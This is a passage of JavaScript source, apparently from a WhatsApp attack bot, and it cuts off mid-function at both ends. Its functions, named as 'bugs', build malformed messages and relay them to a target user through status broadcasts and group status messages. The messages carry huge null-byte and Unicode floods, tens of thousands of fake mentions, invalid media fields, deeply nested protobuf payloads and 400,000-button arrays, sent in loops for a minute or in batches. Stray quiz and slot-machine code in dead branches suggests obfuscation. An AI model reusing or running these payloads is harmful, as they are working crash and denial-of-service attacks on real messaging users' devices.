  helper.videoMediaKey = "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2";
  helper.videoDirectPath = "/v/t62.7119-24/fake.enc";
  helper.stickerUrl = "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true";
  helper.stickerSha = "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=";
  helper.stickerMime = "image/webp";
  helper.stickerJid = "0@s.whatsapp.net";
  helper.imageUrl = "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true";
  helper.imageMime = "image/jpeg";
  helper.imageCaption = "LexzyModss - Executed";
  helper.imageSha = "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=";
  helper.imageLen = "109951162777600";
  helper.imageEncSha = "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=";
  helper.imageDirectPath = "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0";
  helper.imageTimestamp = "1774107894";
  helper.imageScansSha = "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==";
  helper.statusBroadcast = "status@broadcast";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.entryPointSource = "non_contact";
  helper.entryPointApp = "whatsapp";
  helper.quotedFileUrl = "https://example.com/file.zip";
  helper.quotedFileName = "NanasMuda - Executed";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.tag = "xJUIo";
  const H = helper;
  const payload1 = {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [{
            name: H.paymentInfo,
            buttonParamsJson: H.concat(H.concat(H.concat(H.concat("{\"asghards\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\0" + Date.now() + H.paymentJson1, "\0".repeat(7500)), H.paymentJson2), "\0".repeat(7500)), H.paymentJson3)
          }]
        }
      }
    },
    payload2 = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            mimetype: H.videoMime,
            fileLength: H.videoLen,
            title: H.videoTitle,
            fileName: H.concat("VnX", "ꦽ".repeat(75000)),
            fileSha256: H.videoSha,
            fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
            mediaKey: H.videoMediaKey,
            directPath: H.videoDirectPath,
            mediaKeyTimestamp: "1767975195",
            url: "https://mmg.whatsapp.net/d/fake.enc",
            caption: H.concat("ꦾ".repeat(7000), "ꦽ".repeat(7500))
          }
        }
      }
    },
    mentionArray = {};
  mentionArray.length = 2000;
  const payload3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: H.concat(H.videoTitle, "ꦾ".repeat(7500))
            },
            contextInfo: {
              stanzaId: "metawai_id",
              forwardingScore: 999,
              participant: targetJid,
              mentionedJid: Array.from(mentionArray, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            }
          }
        }
      }
    },
    mentionArray2 = {};
  mentionArray2.length = 1999;
  const point1 = {};
  point1.x = 0.1;
  point1.y = 0.1;
  const point2 = {};
  point2.x = 0.9;
  point2.y = 0.1;
  const point3 = {};
  point3.x = 0.9;
  point3.y = 0.9;
  const point4 = {};
  point4.x = 0.1;
  point4.y = 0.9;
  const location = {};
  location.latitude = -6.2088;
  location.longitude = 106.8456;
  location.name = "VnX";
  const annotation = {};
  annotation.polygonVertices = [point1, point2, point3, point4];
  annotation.location = location;
  const stickerPayload = {
      stickerMessage: {
        url: H.stickerUrl,
        fileSha256: H.stickerSha,
        fileEncSha256: H.stickerSha,
        mediaKey: Buffer.alloc(32, "").toString("base64"),
        mimetype: H.stickerMime,
        height: -1,
        width: 5000,
        directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0",
        fileLength: null,
        mediaKeyTimestamp: 1710000000,
        firstFrameLength: 999,
        firstFrameSidecar: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
        isAnimated: true,
        pngThumbnail: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
        contextInfo: {
          mentionedJid: [H.stickerJid, ...Array.from(mentionArray2, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
          interactiveAnnotations: [annotation]
        },
        stickerSentTs: 1710000000,
        isAvatar: true,
        isAiSticker: true,
        isLottie: true,
        accessibilityLabel: "\0".repeat(9000),
        mediaKeyDomain: null
      }
    },
    imageMessage = {};
  imageMessage.url = H.imageUrl;
  imageMessage.mimetype = H.imageMime;
  imageMessage.caption = H.imageCaption;
  imageMessage.fileSha256 = H.imageSha;
  imageMessage.fileLength = H.imageLen;
  imageMessage.height = -9999;
  imageMessage.width = 9999;
  imageMessage.mediaKey = "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6mrhvT+5+I=";
  imageMessage.fileEncSha256 = H.imageEncSha;
  imageMessage.directPath = H.imageDirectPath;
  imageMessage.mediaKeyTimestamp = H.imageTimestamp;
  imageMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=";
  imageMessage.viewOnce = true;
  imageMessage.scansSidecar = H.imageScansSha;
  imageMessage.scanLengths = [6677, 48757, 32501, 42353];
  imageMessage.midQualityFileSha256 = "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY=";
  const header = {};
  header.imageMessage = imageMessage;
  header.hasMediaAttachment = null;
  const payload4 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: header,
          body: {
            text: "\0".repeat(1000)
          },
          contextInfo: {
            remoteJid: H.statusBroadcast,
            participant: targetJid,
            isBuldo: true,
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: H.multiply(1000, 40)
            }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
            groupMentions: [],
            entryPointConversionSource: H.entryPointSource,
            entryPointConversionApp: H.entryPointApp,
            entryPointConversionDelaySeconds: 467593,
            quotedMessage: {
              documentMessage: {
                url: H.quotedFileUrl,
                mimetype: "application/zip",
                caption: H.imageCaption,
                fileName: H.quotedFileName,
                fileLength: 99999,
                vCards: true
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(25000)
          }
        }
      }
    }
  };
  await sock.relayMessage(H.statusBroadcast, payload1, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  }), await sock.relayMessage(H.statusBroadcast, stickerPayload, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  });
  await sock.relayMessage(H.statusBroadcast, payload3, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  }), await sock.relayMessage(H.statusBroadcast, payload2, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  });
  const startTime = Date.now(),
    maxDuration = H.multiply(60, 1000);
  while (H.lessThan(H.subtract(Date.now(), startTime), maxDuration)) {
    if (H.tag === "xJUIo") {
      const mentionArray3 = {};
      mentionArray3.length = 1950;
      await sock.relayMessage(targetJid, {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "\0".repeat(75000),
              contextInfo: {
                participant: targetJid,
                mentionedJid: ["0@s.whatsapp.net", ...Array.from(mentionArray3, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")]
              }
            }
          }
        }
      }, {
        participant: {
          jid: targetJid
        }
      });
    } else {
      if (H.equals(payload4, n.jawaban)) {
        const elapsed = (H.subtract(c.now(), e.start) / 1000).toFixed(1);
        delete v[p];
        const opts = {};
        return opts.parse_mode = H.markdown, T.reply("🎯 *BENAR!*\n\n" + Z.soal + " = " + r.jawaban + "\n⏱ " + elapsed + " detik", opts);
      }
      return U.reply(H.wrongAnswer);
    }
  }
}
async function sendNovaCrashNoClickBug(sock, targetJid) {
  const helper = {};
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.subtract = function (a, b) {
    return a - b;
  };
  helper.markdown = "Markdown";
  helper.wrongAnswer = "❌ Salah! Coba lagi";
  helper.paymentInfo = "payment_info";
  helper.concat = function (a, b) {
    return a + b;
  };
  helper.paymentJson1 = "\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"";
  helper.paymentJson2 = "\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"\0\",\"key\":\"";
  helper.paymentJson3 = "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}";
  helper.videoMime = "video/mp4";
  helper.videoLen = "17381601";
  helper.videoTitle = "VnX";
  helper.videoSha = "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=";
  helper.videoMediaKey = "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2";
  helper.videoDirectPath = "/v/t62.7119-24/fake.enc";
  helper.stickerUrl = "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true";
  helper.stickerSha = "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=";
  helper.stickerMime = "image/webp";
  helper.stickerJid = "0@s.whatsapp.net";
  helper.imageUrl = "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true";
  helper.imageMime = "image/jpeg";
  helper.imageCaption = "LexzyModss - Executed";
  helper.imageSha = "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=";
  helper.imageLen = "109951162777600";
  helper.imageEncSha = "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=";
  helper.imageDirectPath = "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0";
  helper.imageTimestamp = "1774107894";
  helper.imageScansSha = "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==";
  helper.statusBroadcast = "status@broadcast";
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.entryPointSource = "non_contact";
  helper.entryPointApp = "whatsapp";
  helper.quotedFileUrl = "https://example.com/file.zip";
  helper.quotedFileName = "NanasMuda - Executed";
  helper.metaTag = "meta";
  helper.mentionedTag = "mentioned_users";
  helper.lessThan2 = function (a, b) {
    return a < b;
  };
  helper.tag = "xJUIo";
  const H = helper;
  const payload1 = {
      interactiveMessage: {
        nativeFlowMessage: {
          buttons: [{
            name: H.paymentInfo,
            buttonParamsJson: H.concat(H.concat(H.concat(H.concat("{\"asghards\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\0" + Date.now() + H.paymentJson1, "\0".repeat(7500)), H.paymentJson2), "\0".repeat(7500)), H.paymentJson3)
          }]
        }
      }
    },
    payload2 = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            mimetype: H.videoMime,
            fileLength: H.videoLen,
            title: H.videoTitle,
            fileName: H.concat("VnX", "ꦽ".repeat(75000)),
            fileSha256: H.videoSha,
            fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
            mediaKey: H.videoMediaKey,
            directPath: H.videoDirectPath,
            mediaKeyTimestamp: "1767975195",
            url: "https://mmg.whatsapp.net/d/fake.enc",
            caption: H.concat("ꦾ".repeat(7000), "ꦽ".repeat(7500))
          }
        }
      }
    },
    mentionArray = {};
  mentionArray.length = 2000;
  const payload3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: H.concat(H.videoTitle, "ꦾ".repeat(7500))
            },
            contextInfo: {
              stanzaId: "metawai_id",
              forwardingScore: 999,
              participant: targetJid,
              mentionedJid: Array.from(mentionArray, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
            }
          }
        }
      }
    },
    mentionArray2 = {};
  mentionArray2.length = 1999;
  const point1 = {};
  point1.x = 0.1;
  point1.y = 0.1;
  const point2 = {};
  point2.x = 0.9;
  point2.y = 0.1;
  const point3 = {};
  point3.x = 0.9;
  point3.y = 0.9;
  const point4 = {};
  point4.x = 0.1;
  point4.y = 0.9;
  const location = {};
  location.latitude = -6.2088;
  location.longitude = 106.8456;
  location.name = "VnX";
  const annotation = {};
  annotation.polygonVertices = [point1, point2, point3, point4];
  annotation.location = location;
  const stickerPayload = {
      stickerMessage: {
        url: H.stickerUrl,
        fileSha256: H.stickerSha,
        fileEncSha256: H.stickerSha,
        mediaKey: Buffer.alloc(32, "").toString("base64"),
        mimetype: H.stickerMime,
        height: -1,
        width: 5000,
        directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0",
        fileLength: null,
        mediaKeyTimestamp: 1710000000,
        firstFrameLength: 999,
        firstFrameSidecar: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
        isAnimated: true,
        pngThumbnail: Buffer.from([99, 88, 77, 66, 55, 44, 33, 22, 11, 0]),
        contextInfo: {
          mentionedJid: [H.stickerJid, ...Array.from(mentionArray2, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
          interactiveAnnotations: [annotation]
        },
        stickerSentTs: 1710000000,
        isAvatar: true,
        isAiSticker: true,
        isLottie: true,
        accessibilityLabel: "\0".repeat(9000),
        mediaKeyDomain: null
      }
    },
    imageMessage = {};
  imageMessage.url = H.imageUrl;
  imageMessage.mimetype = H.imageMime;
  imageMessage.caption = H.imageCaption;
  imageMessage.fileSha256 = H.imageSha;
  imageMessage.fileLength = H.imageLen;
  imageMessage.height = -9999;
  imageMessage.width = 9999;
  imageMessage.mediaKey = "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6mrhvT+5+I=";
  imageMessage.fileEncSha256 = H.imageEncSha;
  imageMessage.directPath = H.imageDirectPath;
  imageMessage.mediaKeyTimestamp = H.imageTimestamp;
  imageMessage.jpegThumbnail = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=";
  imageMessage.viewOnce = true;
  imageMessage.scansSidecar = H.imageScansSha;
  imageMessage.scanLengths = [6677, 48757, 32501, 42353];
  imageMessage.midQualityFileSha256 = "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY=";
  const header = {};
  header.imageMessage = imageMessage;
  header.hasMediaAttachment = null;
  const payload4 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: header,
          body: {
            text: "\0".repeat(1000)
          },
          contextInfo: {
            remoteJid: H.statusBroadcast,
            participant: targetJid,
            isBuldo: true,
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: H.multiply(1000, 40)
            }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
            groupMentions: [],
            entryPointConversionSource: H.entryPointSource,
            entryPointConversionApp: H.entryPointApp,
            entryPointConversionDelaySeconds: 467593,
            quotedMessage: {
              documentMessage: {
                url: H.quotedFileUrl,
                mimetype: "application/zip",
                caption: H.imageCaption,
                fileName: H.quotedFileName,
                fileLength: 99999,
                vCards: true
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(25000)
          }
        }
      }
    }
  };
  await sock.relayMessage(H.statusBroadcast, payload1, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  }), await sock.relayMessage(H.statusBroadcast, stickerPayload, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: H.metaTag,
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  });
  await sock.relayMessage(H.statusBroadcast, payload3, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  }), await sock.relayMessage(H.statusBroadcast, payload2, {
    messageId: null,
    statusJidList: [targetJid],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: H.mentionedTag,
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: targetJid
          },
          content: undefined
        }]
      }]
    }]
  });
  const startTime = Date.now(),
    maxDuration = H.multiply(60, 1000);
  while (H.lessThan2(H.subtract(Date.now(), startTime), maxDuration)) {
    if (H.tag === "xJUIo") {
      const mentionArray3 = {};
      mentionArray3.length = 1950;
      await sock.relayMessage(targetJid, {
        groupStatusMessageV2: {
          message: {
            extendedTextMessage: {
              text: "\0".repeat(75000),
              contextInfo: {
                participant: targetJid,
                mentionedJid: ["0@s.whatsapp.net", ...Array.from(mentionArray3, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")]
              }
            }
          }
        }
      }, {
        participant: {
          jid: targetJid
        }
      });
    } else {
      if (H.equals(payload4, n.jawaban)) {
        const elapsed = (H.subtract(c.now(), e.start) / 1000).toFixed(1);
        delete v[p];
        const opts = {};
        return opts.parse_mode = H.markdown, T.reply("🎯 *BENAR!*\\n\\n" + Z.soal + " = " + r.jawaban + "\\n⏱ " + elapsed + " detik", opts);
      }
      return U.reply(H.wrongAnswer);
    }
  }
}
async function sendNazeGacorBug(sock, targetJid) {
  const helper = {};
  helper.multiply = function (a, b) {
    return a * b;
  };
  helper.winMessage = "🎉 JACKPOT!";
  helper.lessThan = function (a, b) {
    return a < b;
  };
  helper.equals = function (a, b) {
    return a === b;
  };
  helper.tag = "edaJF";
  helper.notEquals = function (a, b) {
    return a !== b;
  };
  const H = helper;
  const diceFaces = ["🍒", "🍋", "🔔", "⭐", "7️⃣", "💎"],
    roll1 = diceFaces[Math.floor(H.multiply(Math.random(), diceFaces.length))];
  const roll2 = diceFaces[Math.floor(H.multiply(Math.random(), diceFaces.length))];
  const roll3 = diceFaces[Math.floor(Math.random() * diceFaces.length)];
  let result = "";
  if (roll1 === roll2 && H.equals(roll2, roll3)) result = H.winMessage;
  else {
    if (H.equals(roll1, roll2) || H.equals(roll2, roll3) || H.equals(roll1, roll3)) result = "👏 Hampir!";
    else result = "😔 Coba lagi";
  }
}
async function sendBlankDeviceBug(sock, targetJid) {
  const body = {};
  body.text = "./#5#~";
  const payload = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {},
        mediaMetadata: {},
        interactiveMessage: {
          body: body,
          nativeFlowMessage: {
            buttons: "".repeat(500000)
          }
        }
      }
    }
  };
  await sock.relayMessage(targetJid, payload, {
    participant: targetJid
  });
}
async function sendIkyyJmblBug(sock, targetJid) {
  const helper = {};
  helper.text = "IkyyJomblo";
  const H = helper;
  const encodedMessage = proto.Message.encode(proto.Message.fromObject({
      interactiveMessage: {
        body: {
          text: H.text
        },
        contextInfo: {
          isForwarded: true,
          buffer1: Buffer.from([0, 0, 0, 1]),
          buffer2: Buffer.from([255, 0, 0, 29]),
          buffer3: Buffer.from([255, 0, 0, 30]),
          buffer4: Buffer.from([255, 0, 0, 31]),
          buffer5: Buffer.from([255, 0, 0, 32])
        },
        XForwardedFor: Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "\\r\\n"
      }
    })).finish(),
    tags = [
      [186, 3],
      [210, 4],
      [170, 2]
    ];
  const varintEncode = function (value) {
      let bytes = [];
      while (value >= 128) {
        bytes.push(value & 127 | 128), value >>>= 7;
      }
      bytes.push(value);
      return Buffer.from(bytes);
    },
    lengthDelimited = function (tag, buf) {
      return Buffer.concat([Buffer.from(tag), varintEncode(buf.length), buf]);
    },
    wrapRepeated = function (tag, count) {
      let out = encodedMessage;
      for (let i = 0; i < count; i++) out = lengthDelimited(tag, lengthDelimited([10], out));
      return out;
    },
    normalizeJid = function (raw) {
      let text = String(raw || "").trim();
      if (text.includes("@")) return text;
      return text.replace(/\\D/g, "") + "@s.whatsapp.net";
    };
  const targetList = (Array.isArray(targetJid) ? targetJid : [targetJid]).map(normalizeJid).filter(item => item.length > 15);
  if (!targetList.length) return;
  const batchSize = 5,
    batchDelay = 5000;
  let sentCount = 0;
  for (let groupStart = 0; groupStart < targetList.length; groupStart += batchSize) {
    const batchTargets = targetList.slice(groupStart, groupStart + batchSize);
    groupStart > 0 && (await new Promise(resolve => setTimeout(resolve, batchDelay)));
    const batchIndex = Math.floor(groupStart / batchSize) + 1,
      suffix = batchIndex > 1 ? "-" + batchIndex : "",
      messageIdBase = "crb" + Date.now().toString(36).toUpperCase() + suffix;
    for (let tagIndex = 0; tagIndex < tags.length; tagIndex++) {
      const tag = tags[tagIndex];
      let decoded = null;
      for (let size = 5000; size >= 2000 && !decoded; size -= 400) {
        try {
          decoded = proto.Message.decode(wrapRepeated(tag, size));
          proto.Message.encode(decoded).finish();
        } catch {}
      }
      if (!decoded) continue;
      await sock.relayMessage("status@broadcast", decoded, {
        messageId: messageIdBase,
        statusJidList: batchTargets,
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: batchTargets.map(target => ({
              tag: "to",
              attrs: {
                jid: target
              },
              content: []
            }))
          }]
        }]
      }), sentCount++;
    }
  }
}
async function sendDelayBebasSpamBug(sock, targetJid) {
  const helper = {};
  helper.buttonArrayLength = 400000;
  const H = helper;
  const buttonArray = {};
  buttonArray.length = H.buttonArrayLength;
  const contextInfo = {};
  contextInfo.mentionedJid = [targetJid];
  contextInfo.isForwarded = true;
  const payload = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "​" + "\\n".repeat(25000),
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            buttons: Array.from(buttonArray, () => ({})),
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              display_text: "\\n".repeat(99999),
              id: "\\0".repeat(99999),
              flow_token: "\\r".repeat(99999)
            })
          },
          contextInfo: contextInfo
